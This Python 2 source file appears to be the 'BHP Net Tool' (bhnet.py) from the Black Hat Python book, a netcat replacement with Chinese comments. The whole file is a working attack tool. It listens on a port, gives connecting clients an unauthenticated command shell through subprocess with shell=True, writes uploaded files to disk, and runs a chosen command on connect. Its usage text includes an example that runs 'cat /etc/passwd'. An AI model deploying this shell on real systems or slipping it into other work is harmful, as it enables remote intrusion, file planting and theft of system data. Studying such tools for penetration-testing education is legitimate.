# -*- coding:utf-8 -*-

import sys
import socket
import getopt
import threading
import subprocess

# 全局变量定义
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhnet.py -t target_host -p port"
    print "-l --listen                - listen on [host]:[port] for " \
          "                             incoming connections"
    print "-e --execute=file_to_run   - execute the given file upon" \
          "                             receiving a connection"
    print "-c --command               - initialize a command shell"
    print "-u --upload=destination    - upon receiving connection upload a" \
          "                             file and write to [destination]"
    print
    print
    print "Examples: "
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135"
    sys.exit()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)

        while True:
            # 等待数据回传
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break

            print response,

            # 等待更多输入
            buffer = raw_input("")
            buffer += "\n"

            # 发送出去
            client.send(buffer)

    except:
        print "[*] Exception! Exiting."
        # 关闭链接
        client.close()


def run_command(command):

    # 删除多余空格
    command = command.rstrip()

    # 运行命令，返回输出
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"

    # 发送输出
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # 检测上传文件
    if len(upload_destination):

        # 读取所有字符，写下目标
        file_buffer = ""

        # 持续读取
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # 写下接收的数据
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()

            # 确认文件已经写出
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)

        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # 检查命令执行
    if len(execute):
        # 运行命令
        output = run_command(execute)
        client_socket.send(output)

    # 如果需要一个命令shell，那么进入另一个循环
    if command:
        while True:
            # 跳出窗口
            client_socket.send("<BHP:#>")

            # 接收文件，直到发现(enter key)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # 返回命令输出
            response = run_command(cmd_buffer)

            # 返回响应数据
            client_socket.send(response)


def server_loop():
    global target

    # 如果没有定义目标，就监听所有接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # 分拆线程处理新的客户端
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # 读取命令选项
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target",
                                    "port", "command", "upload"])
        # getopt.getopt()解释：
        # param1：sys.args[1:] 除去脚本名外的参数列表
        # param2："hle:t:p:cu:"
        # 短格式 --- h,l,c 后面没有冒号：表示后面不带参数;e,t,p,u后面有冒号表示后面需要参数
        # param3:["...","...",...] 长格式
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled option"

    # 监听 or 从标准输入发送数据
    if not listen and len(target) and port > 0:
        # 从命令行读取内存数据
        buffer = sys.stdin.read()

        client_sender(buffer)

    if listen:
        server_loop()

main()
